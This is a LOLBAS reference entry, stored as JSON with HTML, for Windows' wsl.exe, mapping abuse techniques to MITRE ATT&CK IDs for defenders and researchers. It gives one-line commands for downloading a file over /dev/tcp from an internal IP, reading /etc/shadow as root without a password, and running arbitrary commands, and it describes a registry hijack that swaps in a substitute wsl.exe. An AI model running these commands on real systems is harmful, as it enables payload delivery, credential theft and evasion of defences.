{"title": "Wsl.exe", "source": "lolbas", "source_label": "LOLBAS", "path": "wsl", "html": "<h1>Wsl.exe</h1>\n<p>Windows subsystem for Linux executable</p>\n<h2>Download</h2>\n<p>Download file</p>\n<pre><code class=\"language-powershell\">wsl.exe --exec bash -c &#x27;cat &lt; /dev/tcp/192.168.1.10/54 &gt; binary&#x27;</code></pre>\n<p>Downloads file from 192.168.1.10 &mdash; <strong>MITRE:</strong> T1105 &mdash; <strong>Privileges:</strong> User</p>\n<h2>Execute</h2>\n<p>Performs execution of specified file, can be used to execute arbitrary Linux commands.</p>\n<pre><code class=\"language-powershell\">wsl.exe -e /mnt/c/Windows/System32/calc.exe</code></pre>\n<p>Executes calc.exe from wsl.exe &mdash; <strong>MITRE:</strong> T1202 &mdash; <strong>Privileges:</strong> User</p>\n<p>Performs execution of arbitrary Linux commands as root without need for password.</p>\n<pre><code class=\"language-powershell\">wsl.exe -u root -e cat /etc/shadow</code></pre>\n<p>Cats /etc/shadow file as root &mdash; <strong>MITRE:</strong> T1202 &mdash; <strong>Privileges:</strong> User</p>\n<p>Performs execution of arbitrary Linux commands.</p>\n<pre><code class=\"language-powershell\">wsl.exe --exec bash -c &quot;{CMD}&quot;</code></pre>\n<p>Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u &lt;username&gt;`) on the default WSL distro (unless stated otherwise using `-d &lt;distro name&gt;`) &mdash; <strong>MITRE:</strong> T1202 &mdash; <strong>Privileges:</strong> User</p>\n<p>Execute a payload as a child process of `bash.exe` while masquerading as WSL.</p>\n<pre><code class=\"language-powershell\">wsl.exe</code></pre>\n<p>When executed, `wsl.exe` queries the registry value of `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`, which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder. &mdash; <strong>MITRE:</strong> T1218 &mdash; <strong>Privileges:</strong> User</p>", "excerpt": "Wsl.exe Windows subsystem for Linux executable Download Download file wsl.exe --exec bash -c &#x27;cat &lt; /dev/tcp/192.168.1.10/54 &gt; binary&#x27; Downloads file from 192.168.1.10 &mdash; MITRE: T1105 &mdash; Privileges: User Execute Performs…", "tags": ["Execute", "Download"]}